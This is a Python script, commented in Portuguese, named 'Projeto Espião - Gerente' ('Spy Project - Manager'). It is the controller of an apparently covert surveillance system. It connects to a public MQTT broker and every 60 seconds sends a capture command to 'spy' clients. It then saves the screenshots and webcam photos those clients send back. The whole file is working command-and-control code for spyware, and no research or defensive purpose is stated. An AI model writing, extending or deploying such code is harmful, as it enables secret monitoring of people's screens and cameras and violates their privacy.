"""
Projeto Espião - Gerente
---------------------------------------
Este script representa o "Gerente" do projeto espião. Ele se conecta a um broker MQTT, envia comandos para os funcionários (espiões) capturarem a tela e a webcam, e processa os dados recebidos de volta. O script é projetado para ser simples e eficiente, utilizando bibliotecas populares para comunicação MQTT e processamento de dados.
-----------------------
Dependências:
- paho-mqtt: Para comunicação MQTT. 
-----------------------
Nota: Código desenvolvido com auxílio de IA, adaptado para o contexto do projeto.
"""

import asyncio
import json
import base64
import time
import os
import paho.mqtt.client as mqtt

# --- CONFIGURAÇÕES ---
BROKER = "broker.hivemq.com" # Broker público gratuito - Indicação Gemini
PORTA = 1883
TOPICO_COMANDOS = "projeto_espiao/comandos"   
TOPICO_DADOS = "projeto_espiao/dados_retorno"  
PERIODO_SOLICITACAO = 60 

# --- FUNÇÕES DE PROCESSAMENTO ---

def processar_mensagem(client, userdata, msg):
    try:
        dados = json.loads(msg.payload.decode())
        
        if dados.get("tipo") == "imagens":
            id_cliente = dados.get("id_cliente", "desconhecido")
            timestamp = int(time.time())
            
            # Salva a captura de tela
            if dados.get("screenshot"):
                filename_tela = f"{id_cliente}_tela_{timestamp}.jpg"
                with open(filename_tela, "wb") as f:
                    f.write(base64.b64decode(dados["screenshot"]))
            
            # Salva a foto da webcam
            if dados.get("webcam"):
                filename_webcam = f"{id_cliente}_webcam_{timestamp}.jpg"
                with open(filename_webcam, "wb") as f:
                    f.write(base64.b64decode(dados["webcam"]))
                    
            print(f"[OK] Imagens salvas do cliente: {id_cliente}")
            
    except Exception as e:
        print(f"[ERRO] Falha ao processar dados: {e}")

# --- LOOP DE SOLICITAÇÃO ---

async def loop_de_solicitacao(client):
    """Envia o comando de captura global via MQTT a cada N segundos."""
    while True:
        await asyncio.sleep(PERIODO_SOLICITACAO)
        print(f"[*] Enviando ordem de captura global via MQTT...")
        comando = json.dumps({"comando": "CAPTURAR"})
        client.publish(TOPICO_COMANDOS, comando)

# --- CONFIGURAÇÃO DO CLIENTE MQTT ---

def iniciar_mqtt():
    client = mqtt.Client()
    client.on_message = processar_mensagem
    
    print(f"Conectando ao Broker {BROKER}...")
    client.connect(BROKER, PORTA, 60)
    
    client.subscribe(TOPICO_DADOS)
    
    client.loop_start()
    return client

async def main():
    if not os.path.exists("capturas"):
        os.makedirs("capturas")
    os.chdir("capturas")

    client_mqtt = iniciar_mqtt()
    print(f"Gerenciador Online. Solicitações a cada {PERIODO_SOLICITACAO}s.")
    
    await loop_de_solicitacao(client_mqtt)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nDesligando Gerente...")